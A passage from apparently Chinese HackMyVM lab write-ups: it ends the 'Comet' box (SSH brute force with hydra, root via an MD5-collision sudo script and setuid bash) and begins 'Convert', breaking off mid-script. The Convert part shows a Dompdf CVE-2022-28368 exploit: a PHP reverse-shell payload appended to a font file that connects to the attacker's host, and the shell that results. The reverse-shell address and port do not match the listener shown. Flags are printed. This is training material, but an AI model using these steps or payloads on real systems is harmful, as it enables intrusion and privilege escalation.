<pre class="language-zsh" data-language="zsh"><code class="language-zsh">&gt; hydra -L &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;seclists&#x2F;Usernames&#x2F;xato-net-10-million-usernames.txt -p prettywoman  ssh:&#x2F;&#x2F;192.168.56.182
Hydra v9.5 (c) 2023 by van Hauser&#x2F;THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra) starting at 2024-06-11 17:49:19
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 8295455 login tries (l:8295455&#x2F;p:1), ~518466 tries per task
[DATA] attacking ssh:&#x2F;&#x2F;192.168.56.182:22&#x2F;
[22][ssh] host: 192.168.56.182   login: joe   password: prettywoman
[22][ssh] host: 192.168.56.182   login: joe   password: prettywoman</code></pre>
<p>爆破出来了!!!用户名<code>joe</code></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>先是拿到user flag</p>
<pre class="language-zsh" data-language="zsh"><code class="language-zsh">joe@comet:~$ id
uid&#x3D;1000(joe) gid&#x3D;1000(joe) groups&#x3D;1000(joe)
joe@comet:~$ ls -alh
total 32K
drwxr-xr-x 3 joe  joe  4.0K Feb 19  2023 .
drwxr-xr-x 3 root root 4.0K Feb 19  2023 ..
lrwxrwxrwx 1 root root    9 Feb 25  2023 .bash_history -&gt; &#x2F;dev&#x2F;null
-rw-r--r-- 1 joe  joe   220 Feb 19  2023 .bash_logout
-rw-r--r-- 1 joe  joe  3.5K Feb 19  2023 .bashrc
-rwxr-xr-x 1 root root  366 Feb 19  2023 coll
drwxr-xr-x 3 joe  joe  4.0K Feb 19  2023 .local
-rw-r--r-- 1 joe  joe   807 Feb 19  2023 .profile
-rwx------ 1 joe  joe    33 Feb 19  2023 user.txt
joe@comet:~$ cat user.txt 
cc32dbc17ec3ddf89f9e6d0991c82616</code></pre>
<p>看一下家目录有没有其他用户</p>
<pre class="language-zsh" data-language="zsh"><code class="language-zsh">joe@comet:&#x2F;home$ ls -al
total 12
drwxr-xr-x  3 root root 4096 Feb 19  2023 .
drwxr-xr-x 18 root root 4096 Feb 20  2023 ..
drwxr-xr-x  3 joe  joe  4096 Feb 19  2023 joe</code></pre>
<p>并没有，那么就在joe上提权了<br>习惯性的sudo一手</p>
<pre class="language-zsh" data-language="zsh"><code class="language-zsh">joe@comet:~$ sudo -l
Matching Defaults entries for joe on comet:
    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin

User joe may run the following commands on comet:
    (ALL : ALL) NOPASSWD: &#x2F;bin&#x2F;bash &#x2F;home&#x2F;joe&#x2F;coll</code></pre>
<p>看一下coll这个shell脚本</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">joe@comet:~$ <span class="token function">cat</span> coll
<span class="token comment">#!/bin/bash</span>
<span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null

<span class="token assign-left variable">file1</span><span class="token operator">=</span>/home/joe/file1
<span class="token assign-left variable">file2</span><span class="token operator">=</span>/home/joe/file2
<span class="token assign-left variable">md5_1</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>md5sum $file1 <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print $1&#125;'</span><span class="token variable">)</span></span>
<span class="token assign-left variable">md5_2</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>md5sum $file2 <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print $1&#125;'</span><span class="token variable">)</span></span>


<span class="token keyword">if</span>      <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">head</span> <span class="token parameter variable">-n</span> <span class="token number">1</span> $file1<span class="token variable">)</span></span> <span class="token operator">==</span> <span class="token string">"HMV"</span> <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> 
        <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">head</span> <span class="token parameter variable">-n</span> <span class="token number">1</span> $file2<span class="token variable">)</span></span> <span class="token operator">==</span> <span class="token string">"HMV"</span> <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> 
        <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">$md5_1</span> <span class="token operator">==</span> <span class="token variable">$md5_2</span> <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> 
        <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">diff</span> <span class="token parameter variable">-q</span> $file1 $file2<span class="token variable">)</span></span> <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
    <span class="token function">chmod</span> +s /bin/bash
    <span class="token builtin class-name">exit</span> <span class="token number">0</span>
<span class="token keyword">else</span>
    <span class="token builtin class-name">exit</span> <span class="token number">1</span>
<span class="token keyword">fi</span></code></pre>
<p>先求file1和file2的文件md5值，如果file1和file2文件的第一行都是HMV，并且两个文件的md5值相等，并且两个文件不同，那么就能拿到bash<br>想到了工具fastcoll,难道说这个脚本叫coll也是提示?<br>但是我的fastcoll是windows版的，为了避免系统差异，我先用kali生成一个HMV开头的文件，然后在windows上生成两个md5相同的不同文件，然后传到靶机</p>
<pre class="language-zsh" data-language="zsh"><code class="language-zsh"> ~&#x2F;Desktop                                                                                                         root@kali2  19:02:01 
&gt; echo HMV &gt; file                                                                                                           </code></pre>
<p><img src="https://ooo.0x0.ooo/2024/06/11/OJXggi.png" alt="OJXggi.png" loading="lazy"></p>
<pre class="language-zsh" data-language="zsh"><code class="language-zsh"> ~&#x2F;Desktop                                                                                                         root@kali2  19:02:12 
&gt; mv &#39;&#x2F;var&#x2F;run&#x2F;vmblock-fuse&#x2F;blockdir&#x2F;eniRjL&#x2F;msg1.bin&#39; file1                                                
 ~&#x2F;Desktop                                                                                                         root@kali2  19:03:01 
&gt; mv &#39;&#x2F;var&#x2F;run&#x2F;vmblock-fuse&#x2F;blockdir&#x2F;eniRjL&#x2F;msg2.bin&#39;  file2</code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash">joe@comet:~$ <span class="token function">wget</span> http://192.168.56.104:6677/file2
--2024-06-11 <span class="token number">13</span>:03:22--  http://192.168.56.104:6677/file2
Connecting to <span class="token number">192.168</span>.56.104:6677<span class="token punctuation">..</span>. connected.
HTTP request sent, awaiting response<span class="token punctuation">..</span>. <span class="token number">200</span> OK
Length: <span class="token number">192</span> <span class="token punctuation">[</span>application/octet-stream<span class="token punctuation">]</span>
Saving to: ‘file2.2’

file2.2                                 <span class="token number">100</span>%<span class="token punctuation">[</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">]</span>     <span class="token number">192</span>  --.-KB/s    <span class="token keyword">in</span> 0s      

<span class="token number">2024</span>-06-11 <span class="token number">13</span>:03:22 <span class="token punctuation">(</span><span class="token number">3.69</span> MB/s<span class="token punctuation">)</span> - ‘file2.2’ saved <span class="token punctuation">[</span><span class="token number">192</span>/192<span class="token punctuation">]</span>
joe@comet:~$ <span class="token function">wget</span> http://192.168.56.104:6677/file2
--2024-06-11 <span class="token number">13</span>:04:15--  http://192.168.56.104:6677/file2
Connecting to <span class="token number">192.168</span>.56.104:6677<span class="token punctuation">..</span>. connected.
HTTP request sent, awaiting response<span class="token punctuation">..</span>. <span class="token number">200</span> OK
Length: <span class="token number">192</span> <span class="token punctuation">[</span>application/octet-stream<span class="token punctuation">]</span>
Saving to: ‘file2’

file2                                   <span class="token number">100</span>%<span class="token punctuation">[</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">]</span>     <span class="token number">192</span>  --.-KB/s    <span class="token keyword">in</span> 0s      

<span class="token number">2024</span>-06-11 <span class="token number">13</span>:04:15 <span class="token punctuation">(</span><span class="token number">42.1</span> MB/s<span class="token punctuation">)</span> - ‘file2’ saved <span class="token punctuation">[</span><span class="token number">192</span>/192<span class="token punctuation">]</span>

joe@comet:~$ <span class="token function">head</span> <span class="token parameter variable">-n</span> <span class="token number">1</span> file2
HMV
joe@comet:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> joe on comet:
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin

User joe may run the following commands on comet:
    <span class="token punctuation">(</span>ALL <span class="token builtin class-name">:</span> ALL<span class="token punctuation">)</span> NOPASSWD: /bin/bash /home/joe/coll
joe@comet:~$ <span class="token function">sudo</span> /bin/bash /home/joe/coll
joe@comet:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span> /bin/bash
-rwsr-sr-x <span class="token number">1</span> root root <span class="token number">1234376</span> Mar <span class="token number">27</span>  <span class="token number">2022</span> /bin/bash
joe@comet:~$ <span class="token function">bash</span> <span class="token parameter variable">-p</span>
bash-5.1<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>joe<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>joe<span class="token punctuation">)</span> <span class="token assign-left variable">euid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">egid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>,1000<span class="token punctuation">(</span>joe<span class="token punctuation">)</span>
bash-5.1<span class="token comment"># cat /r???/r*</span>
052cf26a6e7e33790391c0d869e2e40c</code></pre>



]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
      <tags>
        <tag>fastcoll</tag>
      </tags>
  </entry>
  <entry>
    <title>HackMyVM-Convert</title>
    <url>/posts/61f88fc9/</url>
    <content><![CDATA[<p><strong>难度:easy</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.152</strong></p>
<p>今天突然上新的靶场，前面有点复杂，群里师傅也很厉害很快找出了解法,我跟着群友们的思路也是拿到了user权限，然后root权限就很easy了</p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nmap 192.168.56.152</span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-04-15 <span class="token number">19</span>:31 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.152
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.000066s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">998</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT   STATE SERVICE
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http
MAC Address: 08:00:27:C1:F3:46 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>

Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">0.13</span> seconds</code></pre>
<p>很干净没什么</p>
<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># dirsearch -u http://192.168.56.152 </span>
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources <span class="token function">import</span> DistributionNotFound, VersionConflict

  _<span class="token operator">|</span><span class="token builtin class-name">.</span> _ _  _  _  _ _<span class="token operator">|</span>_    v0.4.3
 <span class="token punctuation">(</span>_<span class="token operator">||</span><span class="token operator">|</span> _<span class="token punctuation">)</span> <span class="token punctuation">(</span>/_<span class="token punctuation">(</span>_<span class="token operator">||</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token punctuation">)</span>

Extensions: php, aspx, jsp, html, js <span class="token operator">|</span> HTTP method: GET <span class="token operator">|</span> Threads: <span class="token number">25</span> <span class="token operator">|</span> Wordlist size: <span class="token number">11460</span>

Output File: /root/Desktop/reports/http_192.168.56.152/_24-04-15_19-31-54.txt

Target: http://192.168.56.152/

<span class="token punctuation">[</span><span class="token number">19</span>:31:55<span class="token punctuation">]</span> Starting: 
<span class="token punctuation">[</span><span class="token number">19</span>:32:17<span class="token punctuation">]</span> <span class="token number">403</span> -  555B  - /upload/                                          
<span class="token punctuation">[</span><span class="token number">19</span>:32:17<span class="token punctuation">]</span> <span class="token number">301</span> -  169B  - /upload  -<span class="token operator">></span>  http://192.168.56.152/upload/        
                                                                             
Task Completed</code></pre>
<p>目录也是跟干净，直接看web<br><img src="https://ooo.0x0.ooo/2024/04/15/Om6gnv.png" alt="Om6gnv.png" loading="lazy"><br>是一个html转pdf<br>这里其实有个CVE是Dompdf的CVE<br><a href="https://github.com/rvizx/CVE-2022-28368">CVE-2022-28368</a><br>然后还有一个CVE的POC两个可以结合一起来看<br><a href="https://exploit-notes.hdks.org/exploit/web/dompdf-rce/#exploitation">https://exploit-notes.hdks.org/exploit/web/dompdf-rce/#exploitation</a></p>
<p>现在本地写个html，用来让网页获取css渲染</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># cat index.html </span>
<span class="token operator">&lt;</span>link <span class="token assign-left variable">rel</span><span class="token operator">=</span><span class="token string">'stylesheet'</span> <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">'http://192.168.56.104:6677/exploit.css'</span><span class="token operator">></span>
</code></pre>
<p>然后再写exploit.css用来加载恶意的php</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># cat exploit.css</span>
@font-face<span class="token punctuation">&#123;</span>
        font-family:<span class="token string">'exploitfont'</span><span class="token punctuation">;</span>
        src:url<span class="token punctuation">(</span><span class="token string">'http://192.168.56.104:6677/exploit_font.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        font-weight:<span class="token string">'normal'</span><span class="token punctuation">;</span>
        font-style:<span class="token string">'normal'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>
<p>接着再写一个恶意的exp用来反弹shell<br>随便拉一个ttf文件把末尾加上反弹shell的指令</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-name</span> <span class="token string">"*.ttf"</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
<span class="token function">cp</span> /path/to/example.ttf exploit_font.php
<span class="token builtin class-name">echo</span> <span class="token string">"&lt;?php exec("</span>/bin/bash <span class="token parameter variable">-c</span> <span class="token string">'bash -i >&amp; /dev/tcp/192.168.3.104/1234 0>&amp;1'</span><span class="token string">");?>"</span> <span class="token operator">>></span>exploit_font.php</code></pre>
<p>然后生成一个md5供我们访问目录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># echo -n 'http://192.168.56.104:6677/exploit_font.php'|md5sum</span>
4a52e3b353439a3cd044c6fc91ddf114  -</code></pre>
<p>万事俱备,只差shell了</p>
<h2 id="user权限"><a href="#user权限" class="headerlink" title="user权限"></a>user权限</h2><p>kali开个http服务并且开个监听端口</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># python -m http.server 6677</span>
Serving HTTP on <span class="token number">0.0</span>.0.0 port <span class="token number">6677</span> <span class="token punctuation">(</span>http://0.0.0.0:6677/<span class="token punctuation">)</span> <span class="token punctuation">..</span>.
┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nc -lvnp 4567 </span>
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4567</span> <span class="token punctuation">..</span>.
</code></pre>
<p>web访问html文件<br><img src="https://ooo.0x0.ooo/2024/04/15/Om6mDq.png" alt="Om6mDq.png" loading="lazy"><br>然后访问<br><a href="http://192.168.56.152/dompdf/lib/fonts/exploitfont_normal_4a52e3b353439a3cd044c6fc91ddf114.php">http://192.168.56.152/dompdf/lib/fonts/exploitfont_normal_4a52e3b353439a3cd044c6fc91ddf114.php</a><br>后面是刚才生成的md5值拼接上去<br>访问shell就会弹回kali</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nc -lvnp 4567 </span>
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4567</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.56.104<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.56.152<span class="token punctuation">]</span> <span class="token number">48964</span>
bash: cannot <span class="token builtin class-name">set</span> terminal process group <span class="token punctuation">(</span><span class="token number">518</span><span class="token punctuation">)</span>: Inappropriate ioctl <span class="token keyword">for</span> device
bash: no job control <span class="token keyword">in</span> this shell
eva@convert:/var/www/html/dompdf/lib/fonts$ </code></pre>
<p>直接拿到eva的权限,目录下有user flag并且可以读取</p>
<h2 id="提权root"><a href="#提权root" class="headerlink" title="提权root"></a>提权root</h2><h3 id="sudo-l"><a href="#sudo-l" class="headerlink" title="sudo -l"></a>sudo -l</h3><pre class="language-bash" data-language="bash"><code class="language-bash">Matching Defaults entries <span class="token keyword">for</span> eva on convert:
    env_reset, mail_badpass,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin,
    use_pty

User eva may run the following commands on convert:
    <span class="token punctuation">(</span>ALL <span class="token builtin class-name">:</span> ALL<span class="token punctuation">)</span> NOPASSWD: /usr/bin/python3 /home/eva/pdfgen.py *</code></pre>
<p>发现root执行&#x2F;home&#x2F;eva&#x2F;pdfgen.py文件</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> os <span class="token keyword">import</span> path
<span class="token keyword">from</span> time <span class="token keyword">import</span> time
<span class="token keyword">from</span> weasyprint <span class="token keyword">import</span> HTML<span class="token punctuation">,</span> CSS
<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urlparse
<span class="token keyword">from</span> argparse <span class="token keyword">import</span> ArgumentParser
<span class="token keyword">from</span> logging <span class="token keyword">import</span> basicConfig<span class="token punctuation">,</span> INFO<span class="token punctuation">,</span> error<span class="token punctuation">,</span> info<span class="token punctuation">,</span> exception

<span class="token keyword">def</span> <span class="token function">prune_log</span><span class="token punctuation">(</span>log_file<span class="token punctuation">,</span> max_size<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        log_size <span class="token operator">=</span> path<span class="token punctuation">.</span>getsize<span class="token punctuation">(</span>log_file<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token punctuation">(</span><span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> log_size <span class="token operator">></span> max_size<span class="token punctuation">:</span>
            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>log_file<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">pass</span>
            info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Log file pruned. Size exceeded </span><span class="token interpolation"><span class="token punctuation">&#123;</span>max_size<span class="token punctuation">&#125;</span></span><span class="token string"> MB."</span></span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Log file pruned. Size exceeded </span><span class="token interpolation"><span class="token punctuation">&#123;</span>max_size<span class="token punctuation">&#125;</span></span><span class="token string"> MB."</span></span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Error pruning log file: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

log_file <span class="token operator">=</span> <span class="token string">'/home/eva/pdf_gen.log'</span>
prune_log<span class="token punctuation">(</span>log_file<span class="token punctuation">)</span>
basicConfig<span class="token punctuation">(</span>level<span class="token operator">=</span>INFO<span class="token punctuation">,</span> filename<span class="token operator">=</span>log_file<span class="token punctuation">,</span> filemode<span class="token operator">=</span><span class="token string">'a'</span><span class="token punctuation">,</span>
            <span class="token builtin">format</span><span class="token operator">=</span><span class="token string">'%(asctime)s - %(levelname)s - %(message)s'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">is_path_allowed</span><span class="token punctuation">(</span>output_path<span class="token punctuation">)</span><span class="token punctuation">:</span>
    blocked_directories <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"/root"</span><span class="token punctuation">,</span> <span class="token string">"/etc"</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> directory <span class="token keyword">in</span> blocked_directories<span class="token punctuation">:</span>
        <span class="token keyword">if</span> output_path<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span>directory<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>
    <span class="token keyword">return</span> <span class="token boolean">True</span>

<span class="token keyword">def</span> <span class="token function">url_html_to_pdf</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> output_path<span class="token punctuation">)</span><span class="token punctuation">:</span>
    block_schemes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">,</span> <span class="token string">"data"</span><span class="token punctuation">]</span>
    block_hosts <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token string">"localhost"</span><span class="token punctuation">]</span>
    blocked_directories <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"/root"</span><span class="token punctuation">,</span> <span class="token string">"/etc"</span><span class="token punctuation">]</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        start_time <span class="token operator">=</span> time<span class="token punctuation">(</span><span class="token punctuation">)</span>

        scheme <span class="token operator">=</span> urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>scheme
        hostname <span class="token operator">=</span> urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname

        <span class="token keyword">if</span> scheme <span class="token keyword">in</span> block_schemes<span class="token punctuation">:</span>
            error<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>scheme<span class="token punctuation">&#125;</span></span><span class="token string"> scheme is Blocked"</span></span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>scheme<span class="token punctuation">&#125;</span></span><span class="token string"> scheme is Blocked"</span></span><span class="token punctuation">)</span>
            <span class="token keyword">return</span>

        <span class="token keyword">if</span> hostname <span class="token keyword">in</span> block_hosts<span class="token punctuation">:</span>
            error<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>hostname<span class="token punctuation">&#125;</span></span><span class="token string"> hostname is Blocked"</span></span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>hostname<span class="token punctuation">&#125;</span></span><span class="token string"> hostname is Blocked"</span></span><span class="token punctuation">)</span>
            <span class="token keyword">return</span>

        <span class="token keyword">if</span> <span class="token keyword">not</span> is_path_allowed<span class="token punctuation">(</span>output_path<span class="token punctuation">)</span><span class="token punctuation">:</span>
            error<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Output path is not allowed in </span><span class="token interpolation"><span class="token punctuation">&#123;</span>blocked_directories<span class="token punctuation">&#125;</span></span><span class="token string"> directories"</span></span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Error: Output path is not allowed in </span><span class="token interpolation"><span class="token punctuation">&#123;</span>blocked_directories<span class="token punctuation">&#125;</span></span><span class="token string"> directories"</span></span><span class="token punctuation">)</span>
            <span class="token keyword">return</span>

        html <span class="token operator">=</span> HTML<span class="token punctuation">(</span>url<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        html<span class="token punctuation">.</span>write_pdf<span class="token punctuation">(</span>output_path<span class="token punctuation">,</span> stylesheets<span class="token operator">=</span><span class="token punctuation">[</span>CSS<span class="token punctuation">(</span>string<span class="token operator">=</span><span class="token string">'@page &#123; size: A3; margin: 1cm &#125;'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

        end_time <span class="token operator">=</span> time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        elapsed_time <span class="token operator">=</span> end_time <span class="token operator">-</span> start_time
        info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"PDF generated successfully at </span><span class="token interpolation"><span class="token punctuation">&#123;</span>output_path<span class="token punctuation">&#125;</span></span><span class="token string"> in </span><span class="token interpolation"><span class="token punctuation">&#123;</span>elapsed_time<span class="token punctuation">:</span><span class="token format-spec">.2f</span><span class="token punctuation">&#125;</span></span><span class="token string"> seconds"</span></span><span class="token punctuation">)</span>
